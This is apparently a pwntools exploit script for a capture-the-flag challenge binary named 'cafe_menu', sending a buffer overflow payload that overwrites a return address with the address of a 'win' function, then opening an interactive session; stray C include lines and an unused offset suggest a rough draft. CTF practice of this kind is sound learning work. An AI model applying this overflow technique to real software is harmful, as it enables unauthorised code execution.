#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./cafe_menu', checksec=False)

#p = remote("offsec.m0lecon.it", 13597)
p = process(elf.path)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#Your exploit here

gdb.attach(p, gdbscript="continue")

RIP_OFFSET = 63
MENU_LENGTH = 48

payload3 = flat(
        b"A"*MENU_LENGTH+b"\x47",
    p64(elf.sym.win)
        )
p.send(payload3 + b"\xff")
# Stage 1: reach and overwrite idx
#p.send(payload)


p.interactive()
